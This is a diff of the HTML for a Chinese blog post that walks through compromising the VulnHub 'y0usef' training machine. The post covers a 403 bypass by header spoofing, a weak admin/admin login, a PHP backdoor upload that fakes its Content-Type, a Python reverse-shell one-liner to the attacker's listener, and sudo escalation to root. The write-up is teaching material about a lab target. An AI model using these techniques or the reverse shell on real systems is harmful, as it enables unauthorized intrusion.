@@ -13,20 +13,6 @@
 <meta property="og:site_name" content="HDFZZF&#39;s BLOG">
 <meta property="og:description" content="该靶机难度为简单。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png">
 <meta property="article:published_time" content="2022-04-08T16:00:00.000Z">
 <meta property="article:modified_time" content="2022-04-09T07:16:16.597Z">
 <meta property="article:author" content="hdfzzf">
@@ -35,7 +21,6 @@
 <meta property="article:tag" content="指纹探测">
 <meta property="article:tag" content="403 Bypass">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png">
     
     
       
@@ -170,7 +155,8 @@
     <p>该靶机难度为简单。</p>
 <span id="more"></span>
 <h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
+<p>靶机地址：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
 <p>难度：Easy（难度低说明日常中最常见的漏洞）</p>
 <p>目标：取得root权限 + 2Flag</p>
 <p>涉及攻击方法：</p>
@@ -185,7 +171,8 @@
 <li>提权</li>
 </ul>
 <h1 id="linux-sudo命令">Linux sudo命令</h1>
-<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。</p>
+<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo
+所执行的指令就好像是 root 亲自执行。</p>
 <p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. sudo -V # 显示版本编号</span><br><span class="line">2. sudo -h # 显示版本编号及指令的使用方式说明 help</span><br><span class="line">3. sudo -l # 显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">4. sudo -v # 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line">5. sudo -k # 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</span><br><span class="line">6. sudo -s # 执行环境变量中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line">7. sudo -H # 将环境变量中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</span><br><span class="line">8. sudo command # 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b 将要执行的指令</span><br><span class="line">	-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</span><br><span class="line">	-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者id）</span><br></pre></td></tr></table></figure>
 <h1 id="bypass">403&amp;401 Bypass</h1>
@@ -195,7 +182,9 @@
 <li>覆盖URL</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">覆盖URL的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
-<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL 或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL 中的路径（前提是服务器支持这两种标头）</p>
+<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL
+或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL
+中的路径（前提是服务器支持这两种标头）</p>
 <ol start="3" type="1">
 <li>修改来源</li>
 </ol>
@@ -206,9 +195,11 @@
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
 <h1 id="渗透">渗透</h1>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<h2
+id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
 <ul>
 <li>22端口开启ssh服务</li>
 <li>80端口开着http服务，Apache版本2.4.10</li>
@@ -217,17 +208,22 @@
 <h2 id="访问http服务">访问HTTP服务</h2>
 <p>访问80端口，得到提示： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
 <p>查看源码发现没有什么有用的信息，那就进行路径发现。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
 <p>先访问了状态码为200的两个文件，发现没什么变化，再去看了一下301的文件</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
-<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403 Bypass。</p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
+<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403
+Bypass。</p>
 <h2 id="指纹探测">指纹探测</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
 <p>像上面收集不到任何信息的时候，可以采用指纹探测，看一下网站的结构（用的什么框架，版本多少，语言是什么之类的信息），如果对应的框架存在漏洞，就可以直接利用！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
 <h2 id="bypass-1">403 Bypass</h2>
 <p>经过尝试，发现在请求头部添加下面信息时，成功访问 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
 <p>注意，如果后面渗透过程中再次出现403，那么就在请求数据包中加入上述信息即可，也可以每个都加（反正没害）。</p>
 <h2 id="弱口令">弱口令</h2>
 <p>拿到输入框一般有以下思路：</p>
@@ -238,7 +234,8 @@
 <li>爆破</li>
 </ol>
 <p>这里随便尝试了下弱口令，居然登录成功！ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
 <h2 id="文件上传">文件上传</h2>
 <p>一进来就看到了<code>Upload file</code></p>
 <p>直接上传一个后门php文件，发现上传不成功，也就是被拦截了。现在需要绕过拦截，常规有以下方法：</p>
@@ -248,28 +245,38 @@
 <li>修改文件头部信息</li>
 </ol>
 <p>经过测试，发现本题后台的验证方式是<code>Content-Type</code>，因此将该信息修改为图片的即可上传成功，并且成功获得路径！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
 <p>命令成功被执行，确定文件上传成功！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
 <p>接下来就是反弹shell了。这里可以采用nc，也可以用python，我这里打算用python，所以先用<code>which python</code>查看以下靶机上是否存在python环境，发现确实存在，那么直接执行python反弹shell的代码即可。（先在kali上进行端口监听）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
 <h2 id="权限提升">权限提升</h2>
 <p>该靶机的权限提升是最简单的。</p>
 <p>首先进行信息收集，发现在家目录下有一个文件<code>user.txt</code>，一看就知道是flag；以及一个目录<code>yousef</code>。查看<code>/etc/passwd</code>发现确实有这么一个用户。</p>
-<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
+<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
 <p>这看过去有点像base64编码的结果。因此尝试解码。</p>
 <blockquote>
 <p>base64编码得到的字符串包含a-zA-Z0-9/+=，最显著的特征就是结果有一个或多个=。</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
 <p>发现居然直接就得到<code>yousef</code>得账号和密码！直接<code>su</code>切换（需要进行shell升级），当然也可以选择用<code>ssh</code>连接</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
 <p>查看以下该用户得sudo权限 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
-<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
+<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
+<p><img
+src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
 <p>提权成功！直接读取<code>/root</code>下的flag即可 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
 <p>该靶机到此结束。</p>
 <h1 id="总结">总结</h1>
@@ -347,7 +354,7 @@
     Copyright &copy;
     
     
-    2021-2022
+    2021-2023
     hdfzzf
   </div>
   <div class="footer-right">
